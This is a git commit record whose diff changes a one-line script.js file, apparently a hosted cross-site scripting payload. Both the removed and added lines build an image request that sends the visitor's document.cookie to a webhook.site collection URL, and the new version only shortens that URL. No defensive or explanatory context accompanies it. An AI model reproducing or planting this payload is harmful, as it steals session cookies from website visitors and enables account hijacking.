631c8dd3f6325b6d1deee090ac287e94486beabd
DuarteSJ <ddduarte@sapo.pt>
2024-12-03 14:58:00 +0000

    script

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-var img = new Image(); img.src = 'https://webhook.site/681c72a0-c018-4652-9d82-46f06591f6c5/907574bc-4d02-4f7d-878b-e35f407a9157?cookie=' + document.cookie;
+var img = new Image(); img.src = 'https://webhook.site/681c72a0-c018-4652-9d82-46f06591f6c5?cookie=' + document.cookie;
